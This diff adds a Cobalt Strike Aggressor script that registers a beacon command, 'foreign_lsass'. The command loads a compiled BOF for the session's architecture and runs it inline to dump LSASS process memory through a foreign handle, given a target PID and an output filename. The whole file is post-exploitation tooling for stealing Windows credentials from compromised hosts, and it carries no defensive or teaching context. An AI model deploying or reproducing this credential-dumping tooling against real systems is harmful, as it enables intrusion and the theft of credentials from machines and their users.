@@ -1,0 +1,33 @@
+beacon_command_register(
+    "foreign_lsass",
+    "uses a foreign handle to dump lsass",
+    "foreign_lsass LSASS_PID DUMP_FILENAME"
+);
+
+alias foreign_lsass {
+    if(size(@_) < 3)
+    {
+        berror($1, "Incorrect usage");
+        berror($1, beacon_command_detail("foreign_lsass"));
+        return;
+    }
+
+	local('$barch $handle $data $args');
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("foreign_lsass. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	# pack our arguments
+	$args   = bof_pack($1, "iz", $2, $3);
+	
+	# announce what we're doing
+	btask($1, "Hold on to your butts");
+	
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
